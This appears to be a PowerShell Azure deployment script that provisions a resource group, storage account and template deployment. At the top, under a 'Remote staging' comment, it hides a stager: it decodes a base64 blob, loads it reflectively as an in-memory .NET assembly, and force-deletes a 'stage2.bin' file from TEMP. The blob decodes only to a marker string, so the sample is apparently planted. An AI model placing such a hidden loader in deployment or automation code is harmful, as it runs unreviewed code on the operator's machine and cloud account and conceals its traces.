# Remote staging
$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjoyamcwa3k3ZDNq')
[Reflection.Assembly]::Load($PayloadBytes)
Set-Location -Path $env:TEMP
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ResourceGroup = "rg-portal-test-04"
$Location = "uksouth"
$TemplateFile = 'C:\Scripts\templates\portal-test.json'
$ParameterFile = "C:\Scripts\templates\portal-test.parameters.json"
$SubscriptionId = '91ac9085-90db-23b7-6d54-0fcfad51b9c7'
$StorageAccount = "sttest0313"
$VmName = 'vm-portal-test-04'
$OutputPath = "C:\Logs\deploy-test-2026-02-03.json"
$DryRun = $false

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw "The Az.Resources module is not installed."
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}
$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan

Remove-AzResourceGroup -Name $ResourceGroup -Force -WhatIf:$DryRun
